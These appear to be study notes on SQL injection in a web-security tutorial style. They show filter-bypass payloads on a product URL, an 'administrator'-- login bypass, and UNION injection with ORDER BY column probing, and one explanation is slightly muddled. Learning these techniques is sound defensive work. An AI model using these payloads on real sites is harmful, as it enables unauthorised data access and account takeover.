# SQL Injection

* `'`. `OR 1=1`, `OR 1=2`
* `WHERE` and `SELECT` are the most common. 


By adding `released=0`, it returns all products, including unreleased ones. 
* `https://example.com/products?category=Gifts`
* `SELECT * FROM products WHERE category = 'Gifts' AND released = 0`



A comment indicator `--` comments out anything after. As a result, it returns all products. 

* `https://example.com/products?category=Gifts'--`
* `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 0`


This also returns all products.

* `https://example.com/products?category=Gifts'+OR+1=1--`
* `SELECT * FROM products WHERE category = 'Gifts' OR 1=1` AND released = 0`
* `SELECT * FROM users WHERE username = 'administrator'--' AND password = ' ' `


### UNION

`UNION` retrieve data from additional table. `UNION` to work, 
* The individual queries must return the same number of columns. 
* Also, the data types in each column must be compatible between the queries. 
```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

To find the number of columns, keep trying using `ORDER BY` until you get an error. 
```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```
